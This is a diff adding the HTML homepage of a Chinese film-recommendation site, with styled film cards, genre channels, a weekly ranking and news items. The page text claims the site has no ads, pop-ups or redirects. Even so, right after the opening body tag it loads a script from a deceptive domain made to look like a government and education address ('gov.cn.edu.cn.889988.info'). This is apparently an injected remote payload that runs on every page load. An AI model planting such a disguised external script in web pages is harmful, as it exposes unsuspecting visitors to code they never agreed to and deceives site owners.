@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="老司机电影网——专注精选电影推荐与观影指南，汇集动作、喜剧、科幻、悬疑、纪录片等各类好片，帮你快速找到值得一看的影片。">
+<meta name="keywords" content="老司机电影网, 电影推荐, 好片推荐, 观影指南, 电影资讯">
+<meta name="author" content="老司机电影网">
+<meta name="robots" content="index, follow">
+<title>老司机电影网｜精选电影推荐与观影指南</title>
+<style>
+  :root{
+    --bg:#070b17;
+    --bg2:#0d1428;
+    --card:#121c34;
+    --line:rgba(255,255,255,.08);
+    --txt:#e8ecf5;
+    --sub:#9aa7c2;
+    --gold:#ffb547;
+    --cyan:#3ddc97;
+    --red:#ff5a6f;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:radial-gradient(1200px 600px at 80% -10%,rgba(61,220,151,.12),transparent 60%),
+               radial-gradient(1000px 500px at 0% 10%,rgba(255,90,111,.10),transparent 55%),
+               var(--bg);
+    color:var(--txt);
+    line-height:1.7;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit;text-decoration:none;}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 20px;}
+
+  /* 导航 */
+  header{
+    position:sticky;top:0;z-index:50;
+    backdrop-filter:blur(12px);
+    background:rgba(7,11,23,.78);
+    border-bottom:1px solid var(--line);
+  }
+  .nav{display:flex;align-items:center;gap:18px;height:64px;}
+  .logo{font-size:20px;font-weight:800;letter-spacing:.5px;display:flex;align-items:center;gap:8px;}
+  .logo .dot{width:10px;height:10px;border-radius:50%;background:var(--cyan);box-shadow:0 0 14px var(--cyan);}
+  .logo b{background:linear-gradient(90deg,var(--gold),var(--red));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap;}
+  .nav-links a{
+    padding:8px 14px;border-radius:999px;font-size:14px;color:var(--sub);
+    transition:.25s;
+  }
+  .nav-links a:hover{color:var(--txt);background:rgba(255,255,255,.06);}
+  .nav-links a.active{color:#07101f;background:var(--cyan);font-weight:700;}
+
+  /* 首屏 */
+  .hero{
+    padding:80px 0 60px;
+    display:grid;grid-template-columns:1.1fr .9fr;gap:48px;align-items:center;
+  }
+  .eyebrow{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:6px 14px;border-radius:999px;
+    background:rgba(255,181,71,.12);color:var(--gold);
+    font-size:13px;font-weight:600;margin-bottom:20px;
+  }
+  .eyebrow i{width:6px;height:6px;border-radius:50%;background:var(--gold);animation:pulse 1.6s infinite;}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+  h1{font-size:clamp(34px,5vw,60px);line-height:1.12;font-weight:850;letter-spacing:-1px;}
+  h1 em{font-style:normal;background:linear-gradient(100deg,var(--cyan),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .hero p{color:var(--sub);font-size:17px;margin:22px 0 30px;max-width:520px;}
+  .cta{display:flex;gap:14px;flex-wrap:wrap;}
+  .btn{
+    padding:14px 28px;border-radius:14px;font-size:15px;font-weight:700;
+    border:1px solid transparent;cursor:pointer;transition:.25s;
+  }
+  .btn-primary{background:var(--cyan);color:#06201a;}
+  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(61,220,151,.3);}
+  .btn-ghost{background:transparent;color:var(--txt);border-color:var(--line);}
+  .btn-ghost:hover{border-color:var(--cyan);color:var(--cyan);}
+  .stats{display:flex;gap:36px;margin-top:40px;flex-wrap:wrap;}
+  .stat .n{font-size:30px;font-weight:800;}
+  .stat .n span{color:var(--gold);}
+  .stat .l{font-size:13px;color:var(--sub);}
+
+  /* 胶片栈 */
+  .reels{position:relative;height:420px;}
+  .reel{
+    position:absolute;width:250px;height:370px;border-radius:18px;
+    background:linear-gradient(160deg,var(--card),#0a1122);
+    border:1px solid var(--line);
+    padding:14px;box-shadow:0 30px 60px rgba(0,0,0,.5);
+    transition:.5s;
+  }
+  .reel img{width:100%;height:100%;object-fit:cover;border-radius:10px;display:block;}
+  .r1{transform:rotate(-12deg) translate(-30px,10px);z-index:1;}
+  .r2{transform:rotate(4deg) translate(70px,30px);z-index:2;}
+  .r3{transform:rotate(20deg) translate(160px,0);z-index:3;}
+  .reels:hover .r1{transform:rotate(-16deg) translate(-50px,0);}
+  .reels:hover .r3{transform:rotate(26deg) translate(180px,-10px);}
+
+  /* 通用区块 */
+  section{padding:70px 0;}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:36px;}
+  .sec-head h2{font-size:clamp(24px,3vw,36px);font-weight:800;}
+  .sec-head h2 small{display:block;font-size:14px;color:var(--cyan);font-weight:600;letter-spacing:2px;margin-bottom:6px;}
+  .sec-head .more{color:var(--sub);font-size:14px;}
+  .sec-head .more:hover{color:var(--gold);}
+
+  /* 栏目一：片单 */
+  .grid{display:grid;gap:22px;}
+  .g4{grid-template-columns:repeat(4,1fr);}
+  .g3{grid-template-columns:repeat(3,1fr);}
+  .g2{grid-template-columns:repeat(2,1fr);}
+  .card{
+    background:linear-gradient(180deg,var(--card),rgba(18,28,52,.4));
+    border:1px solid var(--line);border-radius:18px;overflow:hidden;
+    transition:.3s;
+  }
+  .card:hover{transform:translateY(-6px);border-color:rgba(61,220,151,.4);}
+  .thumb{position:relative;aspect-ratio:3/4;overflow:hidden;background:#0a1122;}
+  .thumb::after{
+    content:"";position:absolute;inset:0;
+    background:linear-gradient(to top,rgba(7,11,23,.95),transparent 40%);
+  }
+  .thumb .ph{
+    width:100%;height:100%;display:flex;align-items:center;justify-content:center;
+    font-size:34px;font-weight:800;color:rgba(255,255,255,.18);
+  }
+  .tag{
+    position:absolute;top:12px;left:12px;z-index:2;
+    padding:4px 10px;border-radius:8px;font-size:12px;font-weight:700;
+    background:rgba(7,11,23,.75);backdrop-filter:blur(4px);
+  }
+  .tag.hot{color:var(--red);} .tag.new{color:var(--cyan);} .tag.top{color:var(--gold);}
+  .score{
+    position:absolute;top:12px;right:12px;z-index:2;
+    width:38px;height:38px;border-radius:50%;display:grid;place-items:center;
+    font-weight:800;font-size:14px;color:#06201a;background:var(--gold);
+    box-shadow:0 0 16px rgba(255,181,71,.5);
+  }
+  .card-body{padding:16px;}
+  .card-body h3{font-size:17px;margin-bottom:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .meta{display:flex;gap:10px;font-size:12px;color:var(--sub);flex-wrap:wrap;}
+  .meta span{background:rgba(255,255,255,.05);padding:3px 9px;border-radius:6px;}
+
+  /* 栏目二：分类 */
+  .cats{display:grid;grid-template-columns:repeat(6,1fr);gap:14px;}
+  .cat{
+    aspect-ratio:1;border-radius:20px;display:grid;place-items:center;text-align:center;
+    font-weight:700;font-size:15px;position:relative;overflow:hidden;
+    border:1px solid var(--line);transition:.3s;
+  }
+  .cat::before{content:"";position:absolute;inset:0;opacity:.5;transition:.3s;}
+  .cat:hover{transform:scale(1.05);}
+  .cat i{font-style:normal;font-size:26px;display:block;margin-bottom:8px;filter:drop-shadow(0 4px 8px rgba(0,0,0,.4));}
+  .c1::before{background:linear-gradient(160deg,#ff5a6f,#3a0ca3);}
+  .c2::before{background:linear-gradient(160deg,#ffb547,#e36414);}
+  .c3::before{background:linear-gradient(160deg,#3ddc97,#0f766e);}
+  .c4::before{background:linear-gradient(160deg,#6c8cff,#3b28cc);}
+  .c5::before{background:linear-gradient(160deg,#c084fc,#7e22ce);}
+  .c6::before{background:linear-gradient(160deg,#22d3ee,#0369a1);}
+
+  /* 栏目三：榜单 */
+  .rank{display:grid;grid-template-columns:1.2fr .8fr;gap:24px;}
+  .rank-list{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:10px;}
+  .rk{
+    display:flex;align-items:center;gap:14px;padding:12px;border-radius:14px;
+    transition:.2s;
+  }
+  .rk:hover{background:rgba(255,255,255,.05);}
+  .rk .no{font-size:22px;font-weight:850;width:34px;text-align:center;}
+  .rk:nth-child(1) .no{color:var(--gold);}
+  .rk:nth-child(2) .no{color:var(--sub);}
+  .rk:nth-child(3) .no{color:#cd7f32;}
+  .rk .t{flex:1;min-width:0;}
+  .rk .t b{display:block;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .rk .t small{color:var(--sub);font-size:12px;}
+  .rk .up{color:var(--cyan);font-size:13px;font-weight:700;}
+  .pick{
+    border-radius:20px;padding:28px;
+    background:linear-gradient(160deg,rgba(255,90,111,.18),rgba(61,220,151,.10));
+    border:1px solid var(--line);
+  }
+  .pick h3{font-size:22px;margin:14px 0 8px;}
+  .pick p{color:var(--sub);font-size:14px;}
+  .stars{color:var(--gold);letter-spacing:2px;font-size:15px;}
+
+  /* 栏目四：资讯 */
+  .news .card-body{padding:20px;}
+  .news h3{font-size:18px;line-height:1.5;white-space:normal;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+  .news p{color:var(--sub);font-size:14px;margin:10px 0;}
+  .date{font-size:12px;color:var(--cyan);}
+
+  /* 关于 */
+  .about-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+  .feat{
+    padding:24px;border-radius:20px;background:var(--card);border:1px solid var(--line);
+    transition:.3s;
+  }
+  .feat:hover{border-color:rgba(255,181,71,.4);transform:translateY(-4px);}
+  .feat .ic{font-size:30px;margin-bottom:12px;}
+  .feat h3{font-size:18px;margin-bottom:8px;}
+  .feat p{color:var(--sub);font-size:14px;}
+
+  /* 页脚 */
+  footer{border-top:1px solid var(--line);padding:50px 0 30px;margin-top:30px;}
+  .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px;}
+  .foot-logo{font-size:22px;font-weight:800;margin-bottom:12px;}
+  .foot-logo b{background:linear-gradient(90deg,var(--gold),var(--red));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  footer p{color:var(--sub);font-size:13px;}
+  footer h4{font-size:15px;margin-bottom:14px;}
+  footer ul{list-style:none;}
+  footer li{margin-bottom:10px;}
+  footer a{color:var(--sub);font-size:13px;}
+  footer a:hover{color:var(--cyan);}
+  .copy{text-align:center;color:var(--sub);font-size:12px;margin-top:36px;padding-top:20px;border-top:1px solid var(--line);}
+
+  /* 移动端 */
+  @media(max-width:900px){
+    .hero{grid-template-columns:1fr;padding:50px 0 30px;}
+    .reels{height:300px;margin:0 auto;max-width:400px;}
+    .reel{width:180px;height:270px;}
+    .r2{transform:rotate(4deg) translate(40px,20px);}
+    .r3{transform:rotate(20deg) translate(110px,0);}
+    .g4,.g3,.cats{grid-template-columns:repeat(2,1fr);}
+    .rank,.about-grid,.foot-grid{grid-template-columns:1fr;}
+  }
+  @media(max-width:560px){
+    .nav{height:58px;gap:10px;}
+    .logo{font-size:16px;}
+    .nav-links a{padding:6px 10px;font-size:13px;}
+    .g4,.g3,.g2{grid-template-columns:1fr;}
+    .cats{grid-template-columns:repeat(3,1fr);}
+    .cat{aspect-ratio:auto;padding:22px 6px;font-size:13px;}
+    .cat i{font-size:22px;}
+    section{padding:50px 0;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <div class="logo"><span class="dot"></span>老司机<b>电影网</b></div>
+    <nav class="nav-links">
+      <a href="#home" class="active">首页</a>
+      <a href="#films">精选片单</a>
+      <a href="#genre">类型频道</a>
+      <a href="#rank">口碑榜单</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 栏目：首页 -->
+<section id="home">
+  <div class="wrap hero">
+    <div>
+      <span class="eyebrow"><i></i>每日更新 · 精选好片</span>
+      <h1>把好电影，<br>开到你的<em>片单</em>里</h1>
+      <p>老司机电影网专注于电影推荐与观影指南，从冷门佳片到院线热门，用一句真话告诉你：这部片子，值不值得看。</p>
+      <div class="cta">
+        <a class="btn btn-primary" href="#films">立即逛片单</a>
+        <a class="btn btn-ghost" href="#rank">查看本周榜单</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><div class="n"><span>12</span>000+</div><div class="l">收录影片</div></div>
+        <div class="stat"><div class="n"><span>86</span> 位</div><div class="l">推荐编辑</div></div>
+        <div class="stat"><div class="n"><span>4.8</span> 分</div><div class="l">用户评分</div></div>
+      </div>
+    </div>
+    <div class="reels">
+      <div class="reel r1"><img src="https://picsum.photos/id/1015/400/600" alt="电影剧照"></div>
+      <div class="reel r2"><img src="https://picsum.photos/id/1035/400/600" alt="电影剧照"></div>
+      <div class="reel r3"><img src="https://picsum.photos/id/1045/400/600" alt="电影剧照"></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：精选片单 -->
+<section id="films">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>FEATURED</small>精选片单</h2>
+      <a class="more" href="#">查看全部片单 →</a>
+    </div>
+    <div class="grid g4">
+      <article class="card">
+        <div class="thumb">
+          <div class="ph">片</div>
+          <span class="tag hot">热门</span>
+          <span class="score">9.2</span>
+        </div>
+        <div class="card-body">
+          <h3>星际回响</h3>
+          <div class="meta"><span>科幻</span><span>148分钟</span><span>2025</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb">
+          <div class="ph">影</div>
+          <span class="tag new">新片</span>
+          <span class="score">8.7</span>
+        </div>
+        <div class="card-body">
+          <h3>巷口的光</h3>
+          <div class="meta"><span>剧情</span><span>112分钟</span><span>2025</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb">
+          <div class="ph">视</div>
+          <span class="tag top">TOP10</span>
+          <span class="score">9.0</span>
+        </div>
+        <div class="card-body">
+          <h3>无名渡口</h3>
+          <div class="meta"><span>悬疑</span><span>126分钟</span><span>2024</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb">
+          <div class="ph">界</div>
+          <span class="tag">经典</span>
+          <span class="score">8.9</span>
+        </div>
+        <div class="card-body">
+          <h3>夏日终曲</h3>
+          <div class="meta"><span>爱情</span><span>132分钟</span><span>2023</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：类型频道 -->
+<section id="genre">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>CHANNELS</small>类型频道</h2>
+      <a class="more" href="#">全部类型 →</a>
+    </div>
+    <div class="cats">
+      <a class="cat c1" href="#"><i>💥</i>动作</a>
+      <a class="cat c2" href="#"><i>😂</i>喜剧</a>
+      <a class="cat c3" href="#"><i>🚀</i>科幻</a>
+      <a class="cat c4" href="#"><i>🔍</i>悬疑</a>
+      <a class="cat c5" href="#"><i>❤️</i>爱情</a>
+      <a class="cat c6" href="#"><i>🎬</i>纪录片</a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：口碑榜单 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>TOP RATED</small>本周口碑榜单</h2>
+      <a class="more" href="#">历史榜单 →</a>
+    </div>
+    <div class="rank">
+      <div class="rank-list">
+        <div class="rk"><div class="no">01</div><div class="t"><b>星际回响</b><small>科幻 · 导演剪辑版</small></div><div class="up">↑3</div></div>
+        <div class="rk"><div class="no">02</div><div class="t"><b>无名渡口</b><small>悬疑 · 反转结局</small></div><div class="up">↑1</div></div>
+        <div class="rk"><div class="no">03</div><div class="t"><b>巷口的光</b><small>剧情 · 年度黑马</small></div><div class="up">↑5</div></div>
+        <div class="rk"><div class="no">04</div><div class="t"><b>逆风行者</b><small>动作 · 实拍特技</small></div><div class="up">↓1</div></div>
+        <div class="rk"><div class="no">05</div><div class="t"><b>深海来信</b><small>动画 · 治愈系</small></div><div class="up">↑2</div></div>
+        <div class="rk"><div class="no">06</div><div class="t"><b>夏日终曲</b><small>爱情 · 经典重映</small></div><div class="up">—</div></div>
+      </div>
+      <div class="pick">
+        <span class="eyebrow"><i></i>编辑推荐</span>
+        <div class="stars">★★★★☆</div>
+        <h3>本周最值得看：《巷口的光》</h3>
+        <p>一部用安静镜头讲透人情冷暖的年度黑马。没有宏大叙事，只有巷子尽头那一盏始终亮着的灯。老司机电影网诚意推荐，适合一个人安静看完。</p>
+        <a class="btn btn-ghost" href="#">阅读影评 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：影视资讯 -->
+<section id="news" class="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>INSIGHT</small>影视资讯与观后感</h2>
+      <a class="more" href="#">更多文章 →</a>
+    </div>
+    <div class="grid g3">
+      <article class="card">
+        <div class="thumb"><div class="ph">文</div></div>
+        <div class="card-body">
+          <span class="date">2026年10月05日</span>
+          <h3>2026 第四季度，这 10 部片子别错过</h3>
+          <p>从国庆档到年末压轴，我们帮你筛掉了水片。</p>
+          <a class="more" href="#">阅读原文 →</a>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><div class="ph">评</div></div>
+        <div class="card-body">
+          <span class="date">2026年10月02日</span>
+          <h3>科幻片为什么越来越爱讲“回家”？</h3>
+          <p>从《星际回响》聊起，看近年科幻的温情转向。</p>
+          <a class="more" href="#">阅读原文 →</a>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><div class="ph">单</div></div>
+        <div class="card-body">
+          <span class="date">2026年09月28日</span>
+          <h3>周末片单：3 小时，看懂一个人</h3>
+          <p>三部人物传记片，适合不想动脑的放松夜晚。</p>
+          <a class="more" href="#">阅读原文 →</a>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于 -->
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2><small>ABOUT</small>关于老司机电影网</h2>
+    </div>
+    <div class="about-grid">
+      <div class="feat"><div class="ic">🎯</div><h3>只推值得看的</h3><p>拒绝水片与营销通稿。每一部推荐都经过编辑真实观影，用一句话说清：适合谁看，不适合谁看。</p></div>
+      <div class="feat"><div class="ic">🧭</div><h3>分类清晰不迷路</h3><p>按情绪、按场景、按类型找片。想哭、想笑、想烧脑，三秒定位今晚看什么。</p></div>
+      <div class="feat"><div class="ic">⚡</div><h3>更新快、无广告</h3><p>每日更新片单与资讯，页面干净，移动端同样流畅，不弹窗、不跳转。</p></div>
+      <div class="feat"><div class="ic">💬</div><h3>真实评分体系</h3><p>编辑评分 + 观众评分双轨并行，标注“口碑”与“商业”，帮你避开高分陷阱。</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <div class="foot-logo">老司机<b>电影网</b></div>
+        <p>老司机电影网（laosijidianyingwang-app）是一个专注于电影推荐、观影指南与影视资讯的导航型站点。我们不做搬运，只做筛选。</p>
+      </div>
+      <div>
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#films">精选片单</a></li>
+          <li><a href="#genre">类型频道</a></li>
+          <li><a href="#rank">口碑榜单</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>内容栏目</h4>
+        <ul>
+          <li><a href="#news">影视资讯</a></li>
+          <li><a href="#">影评专栏</a></li>
+          <li><a href="#">导演专访</a></li>
+          <li><a href="#">冷门佳片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">网站简介</a></li>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">联系邮箱</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 老司机电影网 laosijidianyingwang-app · 网站网址：https://laosijidianyingwang-app.github.io · 仅供影视资讯与推荐交流，不提供任何资源下载与在线播放
+    </div>
+  </div>
+</footer>
+
+<script>
+  // 导航高亮
+  const links = document.querySelectorAll('.nav-links a');
+  const secs = document.querySelectorAll('section[id]');
+  window.addEventListener('scroll', () => {
+    let cur = '';
+    secs.forEach(s => { if (scrollY >= s.offsetTop - 120) cur = s.id; });
+    links.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + cur));
+  });
+</script>
+</body>
+</html>
